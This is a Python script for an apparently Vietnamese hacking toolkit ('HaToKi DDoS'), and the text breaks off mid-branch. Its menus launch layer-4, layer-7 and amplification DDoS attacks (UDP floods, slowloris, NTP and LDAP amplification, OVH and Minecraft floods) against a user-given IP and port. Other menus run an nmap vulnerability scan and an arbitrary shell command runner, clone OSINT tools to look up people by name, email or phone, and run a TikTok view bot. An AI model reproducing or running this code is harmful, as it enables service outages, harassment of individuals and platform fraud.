from colorama import Fore, Back, Style
from colorama import init, AnsiToWin32
import time
import os
import sys
import socket
import requests
import random
import getpass
import platform
    
init(wrap=False)
stream = AnsiToWin32(sys.stderr).stream

def Banner():
        init(wrap=False)
        stream = AnsiToWin32(sys.stderr).stream
        print(Fore.RED + "                         ======================|", file=stream)
        print(Fore.YELLOW + "                         ======================|", file=stream)
        print(Fore.BLUE + "                         ======================|", file=stream)
        print(Fore.GREEN + "                         ======================|", file=stream)
        print(Fore.CYAN + "                         ======================|", file=stream)
        print(Fore.MAGENTA + "                         ======================|", file=stream)
        print(Fore.RED + "                         ========================================|", file=stream)
        print(Fore.YELLOW + "                         ========================================|", file=stream)
        print(Fore.BLUE + "                         ========================================|", file=stream)
        print(Fore.BLUE + "                         ========================================|", file=stream)
        print(Fore.GREEN + "                         ========================================|_______________", file=stream)
        print(Fore.MAGENTA + "                         =======================================================|", file=stream)
        print(Fore.RED + "                         =======================================================|", file=stream)
        print(Fore.YELLOW + "                         =======================================================|", file=stream)
        print(Fore.BLUE + "                         =======================================================|", file=stream)
        print(Fore.GREEN + "                         =======================================================|", file=stream)

def main():
    if os.name == "Linux":
        os.system("clear")
        Banner()
        print(Back.RESET + Fore.GREEN + " > " + Fore.YELLOW + Back.BLUE + "1 " + Back.RESET + Fore.RESET + Fore.RED + "DDoS")
        print(Back.RESET + Fore.GREEN + " > " + Fore.YELLOW + Back.BLUE + "2 " + Back.RESET + Fore.RESET + Fore.RED + "Vulnerability Scan")
        print(Back.RESET + Fore.GREEN + " > " + Fore.YELLOW + Back.BLUE + "3 " + Back.RESET + Fore.RESET + Fore.RED + "Command Enforcementer")
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "4 " + Back.RESET + Fore.RESET + Fore.RED + "Buff View TikTok")
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "5 " + Back.RESET + Fore.RESET + Fore.RED + "OSINT")

        while True:
            option = input("> ")
            if option == "1":
                os.system("py main.py")
            if option == "2":
                tg = input("Target > ")
                os.system("nmap -sV --script=vulscan/vulscan.nse " + tg)
            if option == "3":
                commd = input("Command > ")
                os.system(commd)
            if option == "4":
                os.system("cd TikTok-ViewBot && python main.py")
            if option == "5":
                from colorama import Fore, Back, Style
                import colorama
                def loadedscr():
                    print(f"""  
                 ___       ________  ________  _______   ________  ________  ___
                |\  \     |\   __  \|\   __  \|\   ___ \|\  ___ \ |\   ___ \|\  \      
                \ \  \    \ \  \|\  \ \  \|\  \ \  \_|\ \ \   __/|\ \  \_|\ \ \  \     
                 \ \  \    \ \  \\\  \ \   __  \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \  \    
                  \ \  \____\ \  \\\  \ \  \ \  \ \  \_\\ \ \  \_|\ \ \  \_\\ \ \__\   
                   \ \_______\ \_______\ \__\ \__\ \_______\ \_______\ \_______\|__|   
                    \|_______|\|_______|\|__|\|__|\|_______|\|_______|\|_______|   ___ 
                                                                                  |\__\
                                                                                  \|__| """)
                def loadedscrsohai():
                        print(f"""  
                     ___       ________  ________  _______   ________  ________  ___
                    |\  \     |\   __  \|\   __  \|\   ___ \|\  ___ \ |\   ___ \|\  \      
                    \ \  \    \ \  \|\  \ \  \|\  \ \  \_|\ \ \   __/|\ \  \_|\ \ \  \     
                     \ \  \    \ \  \\\  \ \   __  \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \  \    
                     \ \  \____\ \  \\\  \ \  \ \  \ \  \_\\ \ \  \_|\ \ \  \_\\ \ \__\   
                      \ \_______\ \_______\ \__\ \__\ \_______\ \_______\ \_______\|__|   
                      \|_______|\|_______|\|__|\|__|\|_______|\|_______|\|_______|   ___ 
                                                                                     |\__\
                                                                                      \|__| """)
                                                                                       
                os.system("clear")
                os.system("git clone https://github.com/mxrch/GHunt && git clone https://github.com/spider863644/PhoneNumber-OSINT && git clone https://github.com/knownsec/ZoomEye-python && git clone https://github.com/hippiiee/osgint && git clone https://github.com/megadose/holehe && git clone https://github.com/mrh0wl/Cloudmare && git clone https://github.com/p1ngul1n0/blackbird ")
                os.system("pip install -r requirements.txt")
                os.system("clear")
                time.sleep(2)
                loadedscr()
                time.sleep(0.5)
                os.system("clear")
                time.sleep(1)
                loadedscrsohai()
                time.sleep(1)
                os.system("clear")

                class Color:
                    colorama.init(autoreset=True)
                    LR = colorama.Fore.LIGHTRED_EX
                    LB = colorama.Fore.LIGHTBLUE_EX
                    LP = colorama.Fore.LIGHTMAGENTA_EX
                    RS = colorama.Fore.RESET





                def OBanner():
                    os.system("clear")
                    print(f"""
                    
                            ███████╗███████╗████████╗████████╗██╗███╗   ██╗ ██████╗ ███████╗
                            ██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝██║████╗  ██║██╔════╝ ██╔════╝
                            ███████╗█████╗     ██║      ██║   ██║██╔██╗ ██║██║  ███╗███████╗
                            ╚════██║██╔══╝     ██║      ██║   ██║██║╚██╗██║██║   ██║╚════██║
                            ███████║███████╗   ██║      ██║   ██║██║ ╚████║╚██████╔╝███████║
                            ╚══════╝╚══════╝   ╚═╝      ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ """)
                    print("1.Language")
                    st = input(": ")
                    if st == "1":
                        print("VI")
                        print("EN")
                        vi_en = input(": ")
                        if vi_en == "VI":
                            vn = True
                        else:
                            vn = False
                    language = "vi"
                    if vn == False:
                        language = "en"
                    else:
                        language = "vi"
                    print(f"""
                                                               
                           _,.---._      ,-,--.   .=-.-..-._        ,--.--------.    ,----.               
                         ,-.' , -  `.  ,-.'-  _\ /==/_ /==/ \  .-._/==/,  -   , -\,-.--` , \  .-.,.---.   
                        /==/_,  ,  - \/==/_ ,_.'|==|, ||==|, \/ /, |==\.-.  - ,-./==|-  _.-` /==/  `   \  
                       |==|   .=.     \==\  \   |==|  ||==|-  \|  | `--`\==\- \  |==|   `.-.|==|-, .=., | 
                       |==|_ : ;=:  - |\==\ -\  |==|- ||==| ,  | -|      \==\_ \/==/_ ,    /|==|   '='  / 
                       |==| , '='     |_\==\ ,\ |==| ,||==| -   _ |      |==|- ||==|    .-' |==|- ,   .'  
                        \==\ -    ,_ //==/\/ _ ||==|- ||==|  /\ , |      |==|, ||==|_  ,`-._|==|_  . ,'.  
                         '.='. -   .' \==\ - , //==/. //==/, | |- |      /==/ -//==/ ,     //==/  /\ ,  ) 
                           `--`--''    `--`---' `--`-` `--`./  `--`      `--`--``--`-----`` `--`-`--`--' 
                            Made By Infinity's Báo Thủ Team
                            """)
                                                                                                    
                    if language == "en":
                        print("----------------------------------------------------------------------------")
                        print("Option    |   Tools Name | Description                                     |")
                        print(f"{Color.LR}    1     {Color.RS}|{Color.LR} BlackBird    {Color.RS}|{Color.LR} Find Social Network Account With Name           {Color.RS}|")
                        print(f"{Color.LP}    2    {Color.RS} |{Color.LP} Cloudmare    {Color.RS}|{Color.LP} Find Any Server's Info                          {Color.RS}|")
                        print(f"{Color.LB}    3     {Color.RS}|{Color.LB} Holehe       {Color.RS}|{Color.LB} Find Any Socials Media Account With Email       {Color.RS}|")
                        print(f"{Color.LR}    4     {Color.RS}|{Color.LR} OSGINT       {Color.RS}|{Color.LR} Find Any Github Accont With Email               {Color.RS}|")
                        print(f"{Color.LP}    5     {Color.RS}|{Color.LP} ZoomEye      {Color.RS}|{Color.LP} Search Any Target's Info. You Need A API Key... {Color.RS}|")
                        print(f"{Color.LB}    6     {Color.RS}|{Color.LB} GHunt        {Color.RS}|{Color.LB} Find Google Account Info By Email               {Color.RS}|")
                        print(f"{Color.LR}    7     {Color.RS}|{Color.LR} PhoneNumber..{Color.RS}|{Color.LR} Find Target's Info With Phonenumer              {Color.RS}|")
                        print(f"{Color.RS}----------------------------------------------------------------------------")
                        print(".")
                    else:
                        print("----------------------------------------------------------------------------")
                        print("Lựa chọn    |   Tên  | Mô tả                                      |")
                        print(f"{Color.LR}    1     {Color.RS}|{Color.LR} BlackBird    {Color.RS}|{Color.LR} Tìm tài thoản mạng xã hội bằng tên              {Color.RS}|")
                        print(f"{Color.LP}    2    {Color.RS} |{Color.LP} Cloudmare    {Color.RS}|{Color.LP} Tìm thông tin của máy chủ                       {Color.RS}|")
                        print(f"{Color.LB}    3     {Color.RS}|{Color.LB} Holehe       {Color.RS}|{Color.LB} Tìm tài khoảm mạng xã hội bằng email            {Color.RS}|")
                        print(f"{Color.LR}    4     {Color.RS}|{Color.LR} OSGINT       {Color.RS}|{Color.LR} Tìm tài khoản Github bằng email                 {Color.RS}|")
                        print(f"{Color.LP}    5     {Color.RS}|{Color.LP} ZoomEye      {Color.RS}|{Color.LP} Tìm thông tin của mục tiêu. Bạn cần một API ... {Color.RS}|")
                        print(f"{Color.LB}    6     {Color.RS}|{Color.LB} GHunt        {Color.RS}|{Color.LB} Tìm thông tin tài khoản Google bằng email       {Color.RS}|")
                        print(f"{Color.LR}    7     {Color.RS}|{Color.LR} PhoneNumber..{Color.RS}|{Color.LR} Tìm thông tin bằng số điện thoại                {Color.RS}|")
                        print(f"{Color.RS}----------------------------------------------------------------------------")
                        print(".")
                def Main():
                    OBanner()
                    while True:
                        OOption = input("Option > ")
                        if OOption == "1":
                            os.system("clear")
                            print(f"""
                                ▄██████▄     ▄████████  ▄█  ███▄▄▄▄       ███        ▄████████    ▄████████ 
                                ███    ███   ███    ███ ███  ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███ 
                                ███    ███   ███    █▀  ███▌ ███   ███    ▀███▀▀██   ███    █▀    ███    ███ 
                                ███    ███   ███        ███▌ ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
                                ███    ███ ▀███████████ ███▌ ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
                                ███    ███          ███ ███  ███   ███     ███       ███    █▄  ▀███████████ 
                                ███    ███    ▄█    ███ ███  ███   ███     ███       ███    ███   ███    ███ 
                       `         ▀██████▀   ▄████████▀  █▀    ▀█   █▀     ▄████▀     ██████████   ███    ███ """)
                            tg = input("TARGET: ")
                            os.system("cd blackbird && python blackbird.py -u " + tg)
                        if OOption == "2":
                            os.system("clear")
                            print(f"""
                                ▒█████    ██████  ██▓ ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
                                ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
                                ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
                                ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
                                ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
                                ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
                                ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
                                ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░         ░     ░░   ░ 
                                ░ ░        ░   ░           ░             ░  ░   ░     """)
                            tg2 = input("TARGET: ")
                            os.system("cd Cloudmare && python Cloudmare.py -u " + tg2)
                        if OOption == "3":
                            os.system("clear")
                            print(f"""
                                  ▄██████▄     ▄████████  ▄█  ███▄▄▄▄       ███        ▄████████    ▄████████ 
                                ███    ███   ███    ███ ███  ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███ 
                                ███    ███   ███    █▀  ███▌ ███   ███    ▀███▀▀██   ███    █▀    ███    ███ 
                                ███    ███   ███        ███▌ ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
                                ███    ███ ▀███████████ ███▌ ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
                                ███    ███          ███ ███  ███   ███     ███       ███    █▄  ▀███████████ 
                                ███    ███    ▄█    ███ ███  ███   ███     ███       ███    ███   ███    ███ 
                       `         ▀██████▀   ▄████████▀  █▀    ▀█   █▀     ▄████▀     ██████████   ███    ███ """)
                            tg3 = input("TARGET: ")
                            os.system("cd holehe && python setup.py install && holehe " + tg3)
                        if OOption == "4":
                            os.system("clear")
                            print(f"""
                                ▒█████    ██████  ██▓ ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
                                ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
                                ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
                                ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
                                ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
                                ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
                                ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
                                ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░         ░     ░░   ░ 
                                ░ ░        ░   ░           ░             ░  ░   ░     """)
                            tg4 = input("TARGET: ")
                            os.system("cd osgint && python osgint.py -e " + tg4)
                        if OOption == "5":
                            os.system("clear")
                            print(f"""
                                  ▄██████▄     ▄████████  ▄█  ███▄▄▄▄       ███        ▄████████    ▄████████ 
                                ███    ███   ███    ███ ███  ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███ 
                                ███    ███   ███    █▀  ███▌ ███   ███    ▀███▀▀██   ███    █▀    ███    ███ 
                                ███    ███   ███        ███▌ ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
                                ███    ███ ▀███████████ ███▌ ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
                                ███    ███          ███ ███  ███   ███     ███       ███    █▄  ▀███████████ 
                                ███    ███    ▄█    ███ ███  ███   ███     ███       ███    ███   ███    ███ 
                       `         ▀██████▀   ▄████████▀  █▀    ▀█   █▀     ▄████▀     ██████████   ███    ███ """)
                            tg5 = input("TARGET: ")
                            api = input("API KEY: ")
                            os.system("cd ZoomEye-python && python setup.py install && zoomeye init -apikey " + api)
                            os.system("cd ZoomEye-python && zoomeye search " + tg5)
                        if OOption == "6":
                            os.system("clear")
                            print(f"""
                                ▒█████    ██████  ██▓ ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
                                ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
                                ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
                                ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
                                ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
                                ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
                                ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
                                ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░         ░     ░░   ░ """)
                            tg6 = input("TARGET: ")
                            os.system("cd GHunt && python main.py login")
                            os.system("cd GHunt && python main.py email " + tg6)
                        if OOption == "7":
                            os.system("clear")
                            print(f"""
                                  ▄██████▄     ▄████████  ▄█  ███▄▄▄▄       ███        ▄████████    ▄████████ 
                                ███    ███   ███    ███ ███  ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███ 
                                ███    ███   ███    █▀  ███▌ ███   ███    ▀███▀▀██   ███    █▀    ███    ███ 
                                ███    ███   ███        ███▌ ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
                                ███    ███ ▀███████████ ███▌ ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
                                ███    ███          ███ ███  ███   ███     ███       ███    █▄  ▀███████████ 
                                ███    ███    ▄█    ███ ███  ███   ███     ███       ███    ███   ███    ███ 
                       `         ▀██████▀   ▄████████▀  █▀    ▀█   █▀     ▄████▀     ██████████   ███    ███ """)
                            os.system("cd PhoneNumber-OSINT && python phonenumber_osint.py")
                        if "help" or "?" in OOption:
                            os.system("clear")
                            OBanner()

                                                                                                              

                            
                try:
                    Main()
                except KeyboardInterrupt:
                    print("Interrupt By User")

        os.system("cls")
        Banner()
        init(wrap=False)
        stream = AnsiToWin32(sys.stderr).stream
        print(Back.RESET + Fore.YELLOW        + " > " + Fore.GREEN + Back.BLUE + "1 " + Back.RESET + Fore.RESET + Fore.RED + "DDoS", file=stream)
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "2 " + Back.RESET + Fore.RESET + Fore.RED + "Vulnerability Scan", file=stream)
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "3 " + Back.RESET + Fore.RESET + Fore.RED + "Command Enforcementer", file=stream)
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "4 " + Back.RESET + Fore.RESET + Fore.RED + "Buff View TikTok", file=stream)
        print(Back.RESET + Fore.YELLOW + " > " + Fore.GREEN + Back.BLUE + "5 " + Back.RESET + Fore.RESET + Fore.RED + "OSINT", file=stream)
        while True:
            option = input("> ")
            if option == "1":
                def clear():
                    os.system('cls' if os.name == 'nt' else 'clear')

                proxys = open('proxies.txt').readlines()
                bots = len(proxys)

                def ascii_vro():
                    clear()
                    print(Fore.BLUE + """
                     ██░ ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ██ ▄█▀ ██▓
                    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓██▒
                    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒██▒
                    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██ █▄ ░██░
                    ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░██░
                     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓
                     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
                     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
                     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   by ...
                                                           """)
                    time.sleep(1.8)
                    clear()

                def si():
                    print("Zalo/Call: 0386062028")
                    print("Information: no info yet")

                def menu():
                    if os.name == "Linux":
                        sys.stdout.write(f"")
                        clear()
                        print('HaToKi DDoS By .... [] ')
                        print(" ")
                        print(Fore.BLUE + """
                            ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
                                ╔═════════════════╩══════════════[HaToKi-DDoS]══════════════╩══════════════════╗
                                ╔╝------------------------------------------------------------------------------╚╗
                               ║   db   db  .d8b.  d888888b  .d88b.  db   dD d888888b      db    db .d888b.     ║
                               ║   88   88 d8' `8b `~~88~~' .8P  Y8. 88 ,8P'   `88'        88    88 VP  `8D     ║
                               ║   88ooo88 88ooo88    88    88    88 88,8P      88         Y8    8P    odD'     ║
                               ║   88~~~88 88~~~88    88    88    88 88`8b      88         `8b  d8'  .88'       ║
                               ║   88   88 88   88    88    `8b  d8' 88 `88.   .88.         `8bd8'  j88.        ║
                               ║   YP   YP YP   YP    YP     `Y88P'  YP   YD Y888888P         YP    888888D     ║
                               ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
                                     ╔══════════════════╩═══════════════════════════╩═══════════════════╗
                                     ║-------------- do not attack government web, gov ---------------║
                                     ╚═════════════╦══════════════════════════════════════╦═════════════╝
                                         ╔═════════╩═════════╗                  ╔═════════╩═════════╗
                                         ║       ╠══════════════════╣           ║
                                         ║    0386062028║ -   -   -   -  - ║   0386062028 ║
                                         ║                   ╠══════════════════╣                   ║
                                         ╚═══════════════════╝                  ╚═══════════════════╝
                                         """)
                    else:
                         init(wrap=False)
                         stream = AnsiToWin32(sys.stderr).stream
                         sys.stdout.write(f"")
                         clear()
                         print('HaToKi DDoS By .... [] ')
                         print(" ")
                         print(Fore.BLUE + """
                                ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
                                    ╔═════════════════╩══════════════[HaToKi-DDoS]══════════════╩══════════════════╗
                                    ╔╝------------------------------------------------------------------------------╚╗
                                    ║   db   db  .d8b.  d888888b  .d88b.  db   dD d888888b      db    db .d888b.     ║
                                    ║   88   88 d8' `8b `~~88~~' .8P  Y8. 88 ,8P'   `88'        88    88 VP  `8D     ║
                                    ║   88ooo88 88ooo88    88    88    88 88,8P      88         Y8    8P    odD'     ║
                                    ║   88~~~88 88~~~88    88    88    88 88`8b      88         `8b  d8'  .88'       ║
                                    ║   88   88 88   88    88    `8b  d8' 88 `88.   .88.         `8bd8'  j88.        ║
                                    ║   YP   YP YP   YP    YP     `Y88P'  YP   YD Y888888P         YP    888888D     ║
                                    ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
                                        ╔══════════════════╩═══════════════════════════╩═══════════════════╗
                                        ║-------------- do not attack government web, gov ---------------║
                                        ╚═════════════╦══════════════════════════════════════╦═════════════╝
                                            ╔═════════╩═════════╗                  ╔═════════╩═════════╗
                                            ║       ╠══════════════════╣           ║
                                            ║    0386062028║ -   -   -   -  - ║   0386062028 ║
                                            ║                   ╠══════════════════╣                   ║
                                            ╚═══════════════════╝                  ╚═══════════════════╝
                                            """, file=stream)


                def main():
                    menu()
                    while(True):
                        cnc = input('''Input :''')
                        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
                            print("ovh-beam: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>")
                            print("")
                        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
                            print("you are surfed layer4")
                        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
                            print("use amp for game ddos")
                        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
                            ()
                        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
                            ()
                        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
                            ()
                        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
                            ()
                        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
                            ()
                        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
                            ()

                        # LAYER 4 METHODS

                        elif "udpbypass" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'./UDPBYPASS {ip} {port}')
                            except IndexError:
                                print('Usage: udpbypass <ip> <port>')
                                print('Example: udpbypass 1.1.1.1 80')

                        elif "stdv2" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'./std {ip} {port}')
                            except IndexError:
                                print('Usage: stdv2 <ip> <port>')
                                print('Example: stdv2 1.1.1.1 80')

                        elif "flux" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                thread = cnc.split()[3]
                                os.system(f'./flux {ip} {port} {thread} 0')
                            except IndexError:
                                print('Usage: flux <ip> <port> <threads>')
                                print('Example: flux 1.1.1.1 80 250')

                        elif "slowloris" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'./slowloris {ip} {port}')
                            except IndexError:
                                print('Usage: slowloris <ip> <port>')
                                print('Example: slowloris 1.1.1.1 80')

                        elif "god" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                time = cnc.split()[3]
                                os.system(f'perl god.pl {ip} {port} 65500 {time}')
                            except IndexError:
                                print('Usage: god <ip> <port> <time>')
                                print('Example: god 1.1.1.1 80 60')

                        elif "destroy" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                time = cnc.split()[3]
                                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
                            except IndexError:
                                print('Usage: destroy <ip> <port> <time>')
                                print('Example: destroy 1.1.1.1 80 60')

                        elif "std" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'./STD-NOSPOOF {ip} {port}')
                            except IndexError:
                                print('Usage: std <ip> <port>')
                                print('Example: std 1.1.1.1 80')

                        elif "home" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                psize = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'perl home.pl {ip} {port} {psize} {time}')
                            except IndexError:
                                print('Usage: home <ip> <port> <packet_size> <time>')
                                print('Example: home 1.1.1.1 80 65500 60')

                        elif "udp" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'python2 udp.py {ip} {port} 0 0')
                            except IndexError:
                                print('Usage: udp <ip> <port>')
                                print('Example: udp 1.1.1.1 80')

                        elif "nfo-killer" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                threads = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
                            except IndexError:
                                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                                print('Example: nfo-killer 1.1.1.1 80 850 60')

                        elif "ovh-raw" in cnc:
                            try:
                                method = cnc.split()[1]
                                ip = cnc.split()[2]
                                port = cnc.split()[3]
                                time = cnc.split()[4]
                                conns = cnc.split()[5]
                                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
                            except IndexError:
                                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

                        elif "tcp" in cnc:
                            try:
                                method = cnc.split()[1]
                                ip = cnc.split()[2]
                                port = cnc.split()[3]
                                time = cnc.split()[4]
                                conns = cnc.split()[5]
                                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
                            except IndexError:
                                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                                print('Example: tcp GET 1.1.1.1 80 60 8500')

                # SPECIAL METHODS

                        elif "stress" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                mode = cnc.split()[3]
                                conn = cnc.split()[4]
                                time = cnc.split()[5]
                                out = cnc.split()[6]
                                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
                            except IndexError:
                                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                                print('MODE: [1] TCP')
                                print('      [2] UDP')
                                print('      [3] HTTP')
                                print('Example: stress 1.1.1.1 80 3 1250 60 5')

                # AMP/GAMES METHODS

                        elif "samp" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'python2 samp.py {ip} {port}')
                            except IndexError:
                                print('Usage: samp <ip> <port>')
                                print('Example: samp 1.1.1.1 7777')

                        elif "ldap" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                thread = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
                            except IndexError:
                                print('Usage: ldap <ip> <port> <threads> <time>')
                                print('Example: ldap 1.1.1.1 80 650 60')

                        elif "minecraft" in cnc:
                            try:
                                ip = cnc.split()[1]
                                throttle = cnc.split()[2]
                                threads = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
                            except IndexError:
                                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                                print('Example: minecraft 1.1.1.1 5000 500 60')

                        elif "ovh-amp" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                os.system(f'./OVH-AMP {ip} {port}')
                            except IndexError:
                                print('Usage: ovh-amp <ip> <port>')
                                print('Example: ovh-amp 1.1.1.1 80')

                        elif "ntp" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                throttle = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
                            except IndexError:
                                print('Usage: ntp <ip> <port> <throttle> <time>')
                                print('Example: ntp 1.1.1.1 22 250 60')

                # LAYER 7 METHODS

                        elif "ovh-beam" in cnc:
                            try:
                                method = cnc.split()[1]
                                ip = cnc.split()[2]
                                port = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
                            except IndexError:
                                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                                print('Example: ovh-beam GET 51.38.92.223 80 60')

                        elif "https-spoof" in cnc:
